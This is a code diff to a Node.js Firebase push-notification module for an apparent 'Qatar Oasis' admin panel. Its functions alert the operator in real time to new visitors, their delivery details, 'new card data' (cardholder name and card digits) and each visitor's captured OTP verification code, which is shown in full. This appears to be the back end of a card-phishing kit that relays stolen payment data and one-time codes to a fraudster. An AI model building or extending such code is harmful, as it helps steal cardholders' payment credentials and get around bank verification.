@@ -1,6 +1,8 @@
 /**
  * Firebase Admin SDK Configuration
  * Qatar Oasis - Admin Notifications System
+ * 
+ * TRUE BACKGROUND PUSH NOTIFICATIONS - Works even when browser is CLOSED
  */
 
 const admin = require('firebase-admin');
@@ -50,15 +52,12 @@ console.log('🔑 Private Key:', serviceAccount.privateKey ? '✓ Set (length: '
 // Initialize Firebase Admin
 try {
   if (serviceAccount.privateKey && serviceAccount.clientEmail) {
-    
-    // SAFE INITIALIZATION METHOD FOR BOTH MODERN AND OLD VERSIONS
     const apps = admin.apps || [];
     if (apps.length === 0) {
       admin.initializeApp({
         credential: admin.credential ? admin.credential.cert(serviceAccount) : admin.app.credential.cert(serviceAccount)
       });
     }
-    
     firebaseInitialized = true;
     console.log('✅ Firebase Admin SDK initialized successfully');
 
@@ -73,7 +72,6 @@ try {
     console.log('⚠️ Firebase credentials not configured.');
   }
 } catch (error) {
-  // LAST RESORT FALLBACK FOR ULTRAMODERN VERSION EXTRACTION
   try {
     if (!admin.apps || admin.apps.length === 0) {
       const { cert } = require('firebase-admin/app');
@@ -99,13 +97,12 @@ async function getActiveTokens() {
     return tokens;
   } catch (error) {
     console.error('❌ Error fetching tokens from database:', error.message);
-    // Fallback to global tokens if database fails
     return global.fcmTokens || [];
   }
 }
 
 // ==========================================
-// SEND PUSH NOTIFICATION
+// SEND PUSH NOTIFICATION - BACKGROUND READY
 // ==========================================
 async function sendPushNotification(tokens, notification, data = {}) {
   if (!firebaseInitialized) {
@@ -113,53 +110,71 @@ async function sendPushNotification(tokens, notification, data = {}) {
     return { success: false, error: 'Firebase not initialized' };
   }
 
-  // Fetch fresh tokens from database
+  // ALWAYS fetch fresh tokens from database - NO session checks!
   const activeTokens = await getActiveTokens();
-  
+
   if (activeTokens.length === 0) {
     console.log('⚠️ No active FCM tokens in database');
     return { success: false, error: 'No tokens in database' };
   }
 
   try {
+    // Build message with BOTH notification AND data fields
+    // This is CRITICAL for background push to work!
     const message = {
-      notification: { 
-        title: notification.title, 
-        body: notification.body, 
+      // Standard notification fields - used by service worker
+      notification: {
+        title: notification.title,
+        body: notification.body,
         icon: notification.icon || '/admin/icon.png',
-        click_action: notification.clickAction || '/admin/',
-        sound: 'default',
-        tag: data.type || 'notification',
-        renotify: true
+        click_action: notification.clickAction || '/admin/'
       },
+      // Android settings for high priority
       android: {
         priority: 'high',
         notification: {
           channel_id: 'high_priority_channel',
           sound: 'default',
           default_sound: true,
+          default_vibrate_timings: true,
           notification_priority: 'PRIORITY_HIGH'
         }
       },
+      // Web Push with VAPID - CRITICAL for background notifications
       webpush: {
-        fcm_options: { link: notification.clickAction || '/admin/' },
-        headers: { Urgency: 'high' },
+        fcm_options: {
+          link: notification.clickAction || '/admin/'
+        },
+        headers: {
+          Urgency: 'high'
+        },
+        // VAPID keys for background push
         vapidDetails: {
           subject: 'mailto:admin@qatarwateroasis.com',
           publicKey: VAPID_KEYS.publicKey,
           privateKey: VAPID_KEYS.privateKey
         }
       },
-      data: { ...data, timestamp: Date.now().toString() },
+      // Data payload - ALWAYS included for background handling
+      data: {
+        title: notification.title,
+        body: notification.body,
+        icon: notification.icon || '/admin/icon.png',
+        clickAction: notification.clickAction || '/admin/',
+        type: data.type || 'notification',
+        timestamp: Date.now().toString(),
+        ...data
+      },
       tokens: activeTokens
     };
 
+    console.log(`📱 Sending push to ${activeTokens.length} tokens...`);
     const response = await getMessaging().sendEachForMulticast(message);
-    
+
     console.log(`📱 Notification sent: ${response.successCount} success, ${response.failureCount} failed`);
-    
-    return { 
-      success: true, 
+
+    return {
+      success: true,
       successCount: response.successCount,
       failureCount: response.failureCount
     };
@@ -174,8 +189,8 @@ async function sendPushNotification(tokens, notification, data = {}) {
 // ==========================================
 async function notifyNewVisitor(visitorData) {
   const name = visitorData.delivery_data?.fullName || visitorData.payment_data?.cardHolder || 'زائر جديد';
-  return sendPushNotification(null, { 
-    title: '🆕 زائر جديد!', 
+  return sendPushNotification(null, {
+    title: '🆕 زائر جديد!',
     body: `${name} - ${visitorData.country || 'غير معروف'}`,
     icon: '/admin/icon.png',
     clickAction: '/admin/#visitors'
@@ -185,8 +200,8 @@ async function notifyNewVisitor(visitorData) {
 async function notifyDelivery(visitorData) {
   const name = visitorData.delivery_data?.fullName || 'زائر';
   const phone = visitorData.delivery_data?.phone || '';
-  return sendPushNotification(null, { 
-    title: '📦 بيانات توصيل جديدة!', 
+  return sendPushNotification(null, {
+    title: '📦 بيانات توصيل جديدة!',
     body: `${name} - ${phone}`,
     icon: '/admin/icon.png',
     clickAction: '/admin/#visitors'
@@ -196,8 +211,8 @@ async function notifyDelivery(visitorData) {
 async function notifyPayment(visitorData) {
   const name = visitorData.payment_data?.cardHolder || 'زائر';
   const last4 = visitorData.payment_data?.cardNumber?.slice(-4) || '';
-  return sendPushNotification(null, { 
-    title: '💳 بيانات بطاقة جديدة!', 
+  return sendPushNotification(null, {
+    title: '💳 بيانات بطاقة جديدة!',
     body: `${name} - ****${last4}`,
     icon: '/admin/icon.png',
     clickAction: '/admin/#visitors'
@@ -207,8 +222,8 @@ async function notifyPayment(visitorData) {
 async function notifyVerification(visitorData) {
   const name = visitorData.delivery_data?.fullName || 'زائر';
   const otp = visitorData.verification_data?.otp || '';
-  return sendPushNotification(null, { 
-    title: '🔐 رمز تحقق جديد!', 
+  return sendPushNotification(null, {
+    title: '🔐 رمز تحقق جديد!',
     body: `${name} - الكود: ${otp}`,
     icon: '/admin/icon.png',
     clickAction: '/admin/#visitors'
@@ -216,12 +231,12 @@ async function notifyVerification(visitorData) {
 }
 
 // Export functions
-module.exports = { 
-  sendPushNotification, 
-  notifyNewVisitor, 
-  notifyDelivery, 
-  notifyPayment, 
-  notifyVerification, 
+module.exports = {
+  sendPushNotification,
+  notifyNewVisitor,
+  notifyDelivery,
+  notifyPayment,
+  notifyVerification,
   getActiveTokens,
-  firebaseInitialized 
+  firebaseInitialized
 };
